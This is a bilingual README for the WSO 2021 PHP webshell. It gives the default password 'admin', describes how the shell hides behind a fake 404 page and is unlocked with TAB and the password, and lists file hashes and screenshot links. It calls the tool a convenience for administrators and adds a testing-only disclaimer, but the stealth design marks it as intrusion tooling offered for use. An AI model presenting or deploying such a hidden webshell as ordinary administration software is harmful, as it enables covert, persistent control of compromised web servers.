# PHP webshell / File manager Web Shell WSO 2021 year

#### Password: admin

#### ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ: Это только в целях тестирования и могут быть использованы только там, где строго было дано согласие. Не используйте это для незаконных целей.

#### DISCLAIMER: This is only for testing purposes and can only be used where strict consent has been given. Do not use this for illegal purposes, period.

## Bugs and enhancements

For bug reports or enhancements, please open an issue here: https://github.com/twepl/wso/issues


Это PHP Shell является полезным инструментом для системы или веб-администратором, чтобы сделать удаленное управление без использования CPanel, подключении с помощью SSH, FTP и т.д. Все действия происходят в веб-браузере

This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser

#### WSO скрывается под страницей 404, нажмите TAB один раз и введите пароль.

#### WSO is hiding under page 404, press TAB once and enter the password.

### Original WSO
##### MD5 b31a3f22d47c8ea3432526fc151e842e
##### SHA-1	f14240e796aecb2ec0083e4028ef3989c8ee24f2
##### SHA-256	d793fc5a165152cc02a39a9e4c34f0256a221969aa5611118dfca5666a264c5a

https://imgur.com/a/AOmf19J

![WSO image 1](https://i.imgur.com/3NfUni5.png)
![WSO image 2](https://i.imgur.com/LYlopP2.png)
